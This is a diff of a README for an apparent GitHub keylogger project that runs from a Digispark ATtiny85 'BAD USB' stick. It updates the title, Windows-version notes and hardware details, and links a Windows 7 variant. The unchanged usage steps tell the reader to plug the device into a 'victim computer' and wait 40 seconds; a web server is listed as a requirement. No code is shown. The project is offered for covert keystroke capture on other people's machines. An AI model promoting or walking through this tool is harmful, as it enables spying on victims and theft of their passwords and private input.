@@ -1,12 +1,10 @@
-# Keylogger
-
-Digispark Attiny85 (BAD USB) ile desteklendirilmiş keylogger. 
-A digispark supported keylogger.
+# Digispark Supported Keylogger
+A digispark supported keylogger.Only worked on W10
 
 
 # Requirements
 
-1-Digispark Attiny85 USB 
+1-Digispark Attiny85 USB(not micro usb)
 2-Python2
 3-Python3
 4-Web server
@@ -18,5 +16,9 @@ A digispark supported keylogger.
 3-Put in digispark to victim computer and wait 40 sec.
 4-All done.
 
+
+
+# Other versions
+Here is the Windows7 version : https://github.com/bertugerkaya/DigiSparkSupportedKeyloggerW7
 
 
